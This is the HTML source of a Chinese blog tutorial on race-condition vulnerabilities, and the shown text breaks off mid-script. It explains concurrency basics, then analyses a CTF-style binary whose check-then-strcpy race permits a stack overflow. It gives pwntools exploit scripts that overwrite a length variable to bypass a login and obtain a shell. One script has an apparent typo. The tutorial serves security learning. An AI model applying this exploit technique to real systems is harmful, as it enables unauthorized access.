@@ -1,0 +1,988 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"leeyuxun.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"./public/search.xml"};
+  </script>
+
+  <meta name="description" content="基础知识条件竞争系统中，最小的运算调度单位是线程，而每个线程又依附于一个进程，条件竞争则是多进程或多线程对一个共享资源操作，因为操作顺序不受控的时候所产生的问题；">
+<meta property="og:type" content="article">
+<meta property="og:title" content="二进制-条件竞争漏洞">
+<meta property="og:url" content="https://leeyuxun.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E.html">
+<meta property="og:site_name" content="Leeyuxun の note">
+<meta property="og:description" content="基础知识条件竞争系统中，最小的运算调度单位是线程，而每个线程又依附于一个进程，条件竞争则是多进程或多线程对一个共享资源操作，因为操作顺序不受控的时候所产生的问题；">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225160645.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225162303.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225164435.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225164959.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225165416.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225165645.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225170238.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225173140.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225175005.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225175315.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225175617.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225180022.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225203832.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225205436.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225210028.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225210341.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225210601.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226095405.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226095603.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226095713.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226100210.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226100504.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226100758.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226101107.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226101232.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226101534.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226102809.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226103552.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226103704.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226103815.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226105719.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226110328.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210226113152.png">
+<meta property="article:published_time" content="2021-02-25T07:49:36.000Z">
+<meta property="article:modified_time" content="2021-03-03T16:45:31.000Z">
+<meta property="article:author" content="李钰璕">
+<meta property="article:tag" content="条件竞争漏洞">
+<meta property="article:tag" content="进程">
+<meta property="article:tag" content="线程">
+<meta property="article:tag" content="协程">
+<meta property="article:tag" content="并发编程">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225160645.png">
+
+<link rel="canonical" href="https://leeyuxun.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>二进制-条件竞争漏洞 | Leeyuxun の note</title>
+  
+    <script>
+      function sendPageView() {
+        if (CONFIG.hostname !== location.hostname) return;
+        var uid = localStorage.getItem('uid') || (Math.random() + '.' + Math.random());
+        localStorage.setItem('uid', uid);
+        navigator.sendBeacon('https://www.google-analytics.com/collect', new URLSearchParams({
+          v  : 1,
+          tid: 'UA-163555158-1',
+          cid: uid,
+          t  : 'pageview',
+          dp : encodeURIComponent(location.pathname)
+        }));
+      }
+      document.addEventListener('pjax:complete', sendPageView);
+      sendPageView();
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Leeyuxun の note</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">BUPT | SCSS</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://leeyuxun.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="李钰璕">
+      <meta itemprop="description" content="安全学习笔记">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leeyuxun の note">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          二进制-条件竞争漏洞
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-02-25 15:49:36" itemprop="dateCreated datePublished" datetime="2021-02-25T15:49:36+08:00">2021-02-25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-04 00:45:31" itemprop="dateModified" datetime="2021-03-04T00:45:31+08:00">2021-03-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">二进制学习</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><p>系统中，最小的运算调度单位是线程，而每个线程又依附于一个进程，条件竞争则是<strong>多进程或多线程对一个共享资源操作，因为操作顺序不受控的时候所产生的问题</strong>；</p>
+<span id="more"></span>
+
+<h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><ul>
+<li>  进程是为了更好的利用CPU资源；</li>
+<li>  进程是系统进行资源分配和调度的一个独立单位；</li>
+<li>  每个进程都有自己的独立内存空间，不同进程通过进程间通信来通信；</li>
+<li>  由于进程比较重要，占据独立的内存，所以上下文进程间的切换开销(栈、寄存器、虚拟内存、文件句柄等)比较大，但相对比较稳定安全；</li>
+</ul>
+<h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><ul>
+<li>  线程的是为了降低上下文切换的消耗，提高系统的并发性，并突破一个进程只能干一样事的缺陷，使到进程内并发成为可能；</li>
+<li>  线程是进程的一个实体，是CPU调度和分派的基本单位，它是比进程更小的能独立运行的基本单位；</li>
+<li>  线程自己基本上不拥有系统资源，只拥有在运行中必不可少的资源(如程序计数器、一组寄存器和栈)，但是它可与同属一个进程的其他的线程共享进程所拥有的全部资源；</li>
+<li>  线程间通信主要通过共享内存，上下文切换很快，资源开销较少，但相比进程不够稳定容易丢失数据；</li>
+</ul>
+<h2 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h2><ul>
+<li>  协程通过在线程中实现调度，避免了陷入内核级别的上下文切换造成的性能损失，进而突破了线程在IO上的性能瓶颈；</li>
+<li>  协程拥有自己的寄存器上下文和栈；</li>
+<li>  协程调度切换时，将寄存器上下文和栈保存到其他地方，在切回来的时候，恢复先前保存的寄存器上下文和栈，直接操作栈则基本没有内核切换的开销；</li>
+</ul>
+<h2 id="并发编程"><a href="#并发编程" class="headerlink" title="并发编程"></a>并发编程</h2><ul>
+<li><p>  目的：并发编程在实际情况是为了提高执行效率，提高系统的利用率；</p>
+</li>
+<li><p>  CPU的速度远快于各种IO，而这也导致了CPU在很多时候，都是在持续等待中；</p>
+</li>
+<li><p>  然而如果利用分时的机制，这样可以让CPU将不同时间片分发给不同的task，这样就能大大的提示CPU的利用率；</p>
+</li>
+<li><p>而且这种机制也可以让多个程序分开执行不同任务；</p>
+  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225160645.png" style="zoom:40%;"></li>
+<li><p>  从整个程序的执行角度来看，程序执行时可以看作是对输入的数据进行计算处理然后输出到特定的设备中；</p>
+</li>
+<li><p>  当其中的一个环节正在执行的时候其他环节就会挂起；</p>
+</li>
+<li><p>  一旦输入阻塞，即IO等待读入数据，那么已读入的数据也不能得到处理，已处理的数据也不能输出，这就造成了CPU的闲置；</p>
+</li>
+<li><p>  如果这三个步骤可以并发执行的话，即使IO在等待输入，CPU仍然可以对已在内存中的数据做计算处理，结果也可以正常输出；</p>
+</li>
+<li><p>  这就提高了CPU的利用率，不会因为输入输出的阻塞，导致CPU的计算能力被浪费；</p>
+</li>
+<li><p>  当有多种类型的任务执行时，为每种任务单独编写程序，比编写混杂在一起的所有任务的程序，要简单的多；</p>
+</li>
+</ul>
+<h1 id="条件竞争漏洞"><a href="#条件竞争漏洞" class="headerlink" title="条件竞争漏洞"></a>条件竞争漏洞</h1><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><ul>
+<li>  当一个系统运行结果，依赖于不可控的事情的先后顺序的时候，就可能发生竞争；</li>
+<li>  往往程序员可能无法注意到这些事情，因为在编写程序的时候，往往认为程序一条线执行下来，但是一个线程在运行中是可能被随时打断，并且挂起，然后去执行其他线程的逻辑。导致出现了设计人员意料之外的情况，最终出现bug；</li>
+</ul>
+<h2 id="条件竞争产生的条件"><a href="#条件竞争产生的条件" class="headerlink" title="条件竞争产生的条件"></a>条件竞争产生的条件</h2><ul>
+<li><strong>并发</strong>，即至少存在两个并发执行流<ul>
+<li>  这里的执行流包括线程、进程、任务等级别的执行流；</li>
+</ul>
+</li>
+<li><strong>共享对象</strong>，即多个并发流会访问同一对象<ul>
+<li>  常见的共享对象有共享内存、文件系统、信号，这些共享对象是用来使得多个程序执行流相互交流；</li>
+</ul>
+</li>
+<li><strong>改变对象</strong>，即至少有一个控制流会改变竞争对象的状态<ul>
+<li>  如果程序只是对对象进行读操作，那么并不会产生条件竞争；</li>
+</ul>
+</li>
+</ul>
+<p>举例分析，如下图：</p>
+<ul>
+<li><p>  task1先对共享的空间进行了一个安全性检查，检查完之后，task2紧接着修改了共享空间的内容，导致task1的安全性检查边的不可控，甚至可以是一个不安全的数据，然而再次在获取数据的时候，就可能出现预期之外的情况，严重的可能导致程序执行流被劫持；</p>
+</li>
+<li><p>但是在程序员的角度，从check到get这个过程中共享空间的内容是不会变的，但是对于多线程来说，这个是未知的；</p>
+  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225162303.png" style="zoom:50%;"></li>
+</ul>
+<h2 id="条件竞争漏洞示例1分析"><a href="#条件竞争漏洞示例1分析" class="headerlink" title="条件竞争漏洞示例1分析"></a>条件竞争漏洞示例1分析</h2><ul>
+<li><p>将程序放入IDA中反汇编，得到main函数如下，调用了init_main()函数和login函数；</p>
+  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225164435.png" style="zoom:40%;"></li>
+<li><p>init_main()函数，发现其利用urandom中的真随机数生成器生成数据，函数利用urandom中的数据为种子，生成一串长为0xf也就是15字节，无法预测password中的密码；</p>
+  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225164959.png" style="zoom:40%;"></li>
+<li><p>login函数</p>
+<ul>
+<li><p>  逻辑上可以看出，<code>read(0, share_buf, 0x100)</code>是先让用户输入了一个password，长度不超过<code>0x100</code>，然后将这个数据保存到<code>&amp;share_buf</code>中，<code>&amp;share_buf</code>是局部变量，保存在栈上的<code>bss</code>段上；</p>
+</li>
+<li><p>再通过<code>pthread_create</code>创建一个<code>check_password</code>的函数去检测<code>&amp;share_buf</code>中保存的password是否为一个合法的值；</p>
+  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225165416.png" style="zoom:50%;"></li>
+</ul>
+</li>
+<li><p>check_password函数</p>
+<ul>
+<li>  a1即share_buf，输入的口令；</li>
+<li>  先根据输入的password长度,在栈上开辟一段空间(alloca函数是在栈上开辟空间)，开辟的空间大小为<code>0x10*((n+0xF)/0x10)</code>；</li>
+<li>  然后再判断输入的长度是否和password的长度一样长，如果不一样则会直接结束；</li>
+<li>  如果一样长则会获取要比较的字符串长度，然后会调用strcpy函数，将用户密码从bss段上复制一份到栈上，然后调用strncmp函数来比较用户输入的密码是否与随机生成密码一样，如果一样的话，则起一个shell，如果不一样，就会登陆失败，直接返回；</li>
+</ul>
+  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225165645.png" style="zoom:50%;"></li>
+<li><p>分析</p>
+<ul>
+<li><p>  bss上的share_buf是作为参数传递给check_password；</p>
+</li>
+<li><p>  即主线程和子线程共同操作同一块内存空间；</p>
+</li>
+<li><p>如果在子线程调用alloc之后，调用strcpy之前，通过主线程去修改位于bss段上的share_buf，就可以在strcpy处产生溢出；</p>
+  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225170238.png" style="zoom:50%;"></li>
+<li><p>  然后在程序中，子进程的strcpy之前有一个<code>sleep(1)</code>操作；</p>
+</li>
+<li><p>导致了alloc到strcpy之间有足够的时间，让主线程去修改共享变量；</p>
+<ul>
+<li>  例如，将共享变量share_buf里面的数据长度改的超过一开始alloc的长度，这样就会造成栈溢出；</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="条件竞争漏洞利用"><a href="#条件竞争漏洞利用" class="headerlink" title="条件竞争漏洞利用"></a>条件竞争漏洞利用</h2><ol>
+<li><p>利用思路</p>
+<ul>
+<li>  checksec发现程序开启了canary，所以直接溢出覆盖返回值是不行的，无法劫持程序流；</li>
+<li>登陆成功，程序会自动起一个shell，如果想要登陆成功：<ol>
+<li> 需要控制strncmp返回值为0；</li>
+<li> 或者是控制dest的地址指向password；</li>
+<li> 或者控制n为0；</li>
+</ol>
+</li>
+<li>  控制dest是不行的，因为dest指向的是stack上，stack的地址一般是<code>0x7f0000000000</code>开头的，而password的地址为<code>0x06020E0</code>又是通过strcpy复制过去的，不能有过多的<code>\x00</code>，所以这里覆盖dest是不可行的；</li>
+<li>  可以利用strcpy会在结尾加<code>\x00</code>的特性去覆盖n，使得n的值为0，这样成功的时候strncmp也可以返回0，以达到绕过登陆的目的；</li>
+</ul>
+</li>
+<li><p>编写payload如下，功能为先启动程序，接着用gdb.attach调试，并且在0x0400CB2处下一个断点，也就是strcpy处下断点，然后先后发两次数据过去，一次长度为<code>0xf</code>个<code>a</code>，一次为<code>0x60</code>个<code>a</code>；</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, endian = <span class="string">'little'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GameStart</span>(<span class="params">ip, port, debug</span>):</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        p = process(<span class="string">'./Racecondition'</span>)</span><br><span class="line">        gdb.attach(p, <span class="string">'b *0x0400CB2'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = retmoe(ip, port)</span><br><span class="line">    p.recvuntil(<span class="string">':\n'</span>)</span><br><span class="line">    p.send(<span class="string">'a'</span> * <span class="number">0xf</span> + <span class="string">'\x00'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">':\n'</span>)</span><br><span class="line">    p.send(<span class="string">'a'</span> * <span class="number">0x60</span> + <span class="string">'\x00'</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    GameStart(<span class="string">''</span>, <span class="number">2333</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225173140.png" style="zoom:33%;"></li>
+<li><p>执行分析</p>
+<ul>
+<li><p>  程序执行过程中，第一次输入<code>0xf</code>个a之后，应该起了第一个线程，并且第一个线程进入到了sleep函数中；</p>
+</li>
+<li><p>  check-password线程先睡眠，但是主进程pthread_create()不会因为check- password线程睡眠而终止，它继续执行后面的return，返回主函数后，接着循环，再执行输入login()函数；</p>
+</li>
+<li><p>  第二次输入0x60个a之后写入share_buf，程序起了第二个check-password线程；</p>
+</li>
+<li><p>  二个线程发现share_buf(即s)长度超了，所以输出了一个”The password length error!”，但是这时候第一个线程在strcpy前还在等待中，然而即将要被复制的share_buf内容却被第二个线程输入了<code>0x60</code>个a，这时候gdb分析栈的信息；</p>
+</li>
+<li><p>gdb已经停在了strcpy函数处；</p>
+  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225175005.png" style="zoom:25%;"></li>
+<li><p>查看src即share_buf中的内容如下，写入<code>0x60</code>个a；</p>
+  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225175315.png" style="zoom:40%;"></li>
+<li><p>查看栈信息如下；</p>
+  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225175617.png" style="zoom:33%;"></li>
+<li><p>ni执行strcpy后，偏移地址0000-0060，写入了<code>0x60</code>个a；</p>
+<p>  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225180022.png"></p>
+</li>
+</ul>
+</li>
+<li><p>重新编写payload，覆盖n，将n置为0，绕过strncmp，获取shell；</p>
+<ul>
+<li><p>从内容上来看，这时候share_buf里面已经存放了<code>0x60</code>个a了，从ida中可以看出， alloca之前的rsp栈顶的位置位于<code>rbp–0x70</code>处(即v4，v4的地址是<code>rsp+0h</code>,即rsp的值，即<code>rbp–0x70</code>；</p>
+  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225203832.png" style="zoom:50%;"></li>
+<li><p>  通过对<code>alloca(16*((n+15)/0x10))</code>的计算，这里应该是<code>16*((0xf+15)/0x10)=0x10</code>(这里n应该是第一个线程的0xf，第一个线程已经把strcpy之前的代码走完了)，相当于alloca重新在栈上分配了<code>0x10</code>空间，rsp向低地址空间增长了<code>0x10</code>；</p>
+</li>
+<li><p>  执行strcpy后，偏移地址<code>0000-0060</code>，写入了<code>0x60</code>个a,发生了栈溢出，继续执行下去会发生段错误，是因为覆盖到了dest地址，使得dest的值变为了<code>0x6161616161616161</code>导致这是一个无效的地址 ，程序在访问的时候，会出现异常;</p>
+</li>
+<li><p>接下来考虑如何覆盖n；</p>
+<ul>
+<li><p>  strcpy是从栈顶开始复制的，而n的位置位于<code>rsp+20</code>，然后前面alloca申请的大小为<code>0x10</code>；</p>
+</li>
+<li><p>所以n应该位于<code>0x30</code>的位置，所幸这里dest的位置比n低，所以在覆盖的时候，只会覆盖n，不会覆盖破坏dest的内容，就可以达到绕过strncmp的目的；</p>
+  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225205436.png" style="zoom:50%;"></li>
+</ul>
+</li>
+<li><p>修改payload如下</p>
+  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, endian = <span class="string">'little'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GameStart</span>(<span class="params">ip, port, debug</span>):</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        p = process(<span 